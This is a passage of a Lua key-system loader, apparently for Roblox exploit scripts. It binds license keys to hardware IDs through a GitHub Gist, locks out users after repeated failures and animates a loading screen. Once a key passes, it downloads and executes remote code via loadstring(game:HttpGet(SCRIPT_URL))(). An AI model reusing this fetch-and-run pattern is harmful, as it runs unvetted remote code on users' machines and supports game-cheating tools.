--  HWID LOCK
-- ══════════════════════════════════════════════════════════════
local function checkAndLockHWID(key)
    local body=fetchGist(true)
    if not body then return false,"HWID server unreachable." end

    local rawContent=readGistFile(body,"hwid_store.json")
    if not rawContent then return false,"HWID store unreadable — contact developer." end

    local store=jsonParse(rawContent)
    local locked=store[key]

    if locked==nil or locked==false then
        for existingKey,boundHWID in pairs(store) do
            if boundHWID==HWID and existingKey~=key then
                return false,"⚠  One key per device.\nThis device is already linked to a different key.\nContact @isvexed to change it."
            end
        end
        store[key]=HWID
        local secRaw=readGistFile(body,"security.json") or '{"bans":{},"strikes":{}}'
        local ok=writeGistFiles({
            ["hwid_store.json"]=jsonBuild(store),
            ["security.json"]=secRaw,
        })
        if not ok then return false,"Failed to register device — try again." end
        return true,"Device registered."
    elseif locked==HWID then
        return true,"Device verified."
    else
        return false,"Key locked to another device.\nContact @isvexed to reset."
    end
end

-- ══════════════════════════════════════════════════════════════
--  LOAD SEQUENCE
-- ══════════════════════════════════════════════════════════════
local STEPS={
    {t="Verifying credentials...", p=0.18,d=0.40},
    {t="Contacting server...",     p=0.38,d=0.45},
    {t="Fetching payload...",      p=0.62,d=0.65},
    {t="Decrypting modules...",    p=0.82,d=0.38},
    {t="Preparing environment...", p=0.96,d=0.42},
    {t="Done. Good luck, soldier.",p=1.00,d=0.28},
}

local function runLoad(onDone)
    ProgBG.Visible=true
    tw(OkBtn,{BackgroundTransparency=1,TextTransparency=1},0.2)
    for _,s in ipairs(STEPS) do
        tw(ProgFill,{Size=UDim2.new(s.p,0,1,0)},s.d,Enum.EasingStyle.Quart)
        ProgL.Text=s.t; task.wait(s.d+0.07)
    end
    tw(CardStroke,{Color=C.OK},0.22); task.wait(0.36)
    tw(Card,{BackgroundTransparency=1},0.42)
    tw(Dim, {BackgroundTransparency=1},0.42); task.wait(0.48)
    pcall(function() Screen:Destroy() end)
    task.spawn(onDone)
end

-- ══════════════════════════════════════════════════════════════
--  ATTEMPT HANDLER
-- ══════════════════════════════════════════════════════════════
local function attempt()
    if busy then return end
    if lockUntil>0 and os.time()<lockUntil then return end
    local raw=KeyBox.Text
    if not raw or raw:match("^%s*$") then setStatus("No key entered.",C.ERR,3); shake(); return end

    task.spawn(function()
        busy=true; OkBtn.Text="Checking..."; OkBtn.Active=false
        tw(OkBtn,{BackgroundColor3=C.SURFACE},0.15)

        local validKey=isValid(raw)

        if not validKey then
            tries=tries+1; updateTries()
            shake()
            tw(InStroke,{Color=C.ERR},0.14,Enum.EasingStyle.Linear)
            tw(KeyBox,{TextColor3=C.ERR},0.14); task.wait(0.42)
            tw(InStroke,{Color=C.BORDER},0.28); tw(KeyBox,{TextColor3=C.TEXT},0.28)
            if tries>=MAX_TRIES then
                lockUntil=os.time()+LOCK_SECS
                setStatus(string.format("🔒 Too many attempts. Locked for %d:%02d.",math.floor(LOCK_SECS/60),LOCK_SECS%60),C.ERR)
                punish("BRUTE_FORCE")
            else
                setStatus("Invalid key — "..(MAX_TRIES-tries).." attempt(s) left.",C.ERR,5)
                OkBtn.Text="UNLOCK ACCESS"; OkBtn.Active=true
                tw(OkBtn,{BackgroundColor3=C.GOLD},0.2); busy=false
            end
            return
        end

        setStatus("Verifying device...",C.MUTED)
        local hwidOK,hwidMsg=checkAndLockHWID(validKey)

        if not hwidOK then
            tries=tries+1; updateTries()
            shake()
            tw(InStroke,{Color=C.ERR},0.14,Enum.EasingStyle.Linear)
            tw(KeyBox,{TextColor3=C.ERR},0.14); task.wait(0.42)
            tw(InStroke,{Color=C.BORDER},0.28); tw(KeyBox,{TextColor3=C.TEXT},0.28)
            setStatus(hwidMsg,C.ERR,7)
            if tries>=MAX_TRIES then
                lockUntil=os.time()+LOCK_SECS
                setStatus(string.format("🔒 Too many attempts. Locked for %d:%02d.",math.floor(LOCK_SECS/60),LOCK_SECS%60),C.ERR)
                punish("HWID_REPEATED_REJECT")
            else
                OkBtn.Text="UNLOCK ACCESS"; OkBtn.Active=true
                tw(OkBtn,{BackgroundColor3=C.GOLD},0.2); busy=false
            end
            return
        end

        -- Save key — file storage survives rejoins; getgenv() covers same-session re-runs
        saveKey(validKey)

        tw(InStroke,{Color=C.OK},0.2); tw(KeyBox,{TextColor3=C.OK},0.2)
        OkBtn.Text="AUTHENTICATED"; tw(OkBtn,{BackgroundColor3=C.OK},0.25)
        setStatus("Access granted. Loading...",C.OK); task.wait(0.35)

        runLoad(function()
            local ok,err=pcall(function()
                loadstring(game:HttpGet(SCRIPT_URL,true))()
            end)
            if not ok then warn("[Loader] "..tostring(err)) end
            wipeSecrets()
            -- Key intentionally NOT cleared here — only punish() clears it
        end)
    end)
end

OkBtn.MouseButton1Click:Connect(attempt)
KeyBox.FocusLost:Connect(function(enter) if enter then attempt() end end)

task.spawn(function()
    task.wait(0.05)
    Card.Position=UDim2.new(0.5,0,0.57,0)
    tw(Card,{Position=UDim2.new(0.5,0,0.5,0)},0.38,Enum.EasingStyle.Back)
    task.wait(0.44)
    if _savedKey then
        KeyBox.Text = _savedKey
        tw(InStroke,{Color=C.GOLD},0.18)
        setStatus("Saved key found. Verifying...",C.MUTED)
        task.wait(0.4)
        attempt()
    else
        pcall(function() KeyBox:CaptureFocus() end)
    end
end)
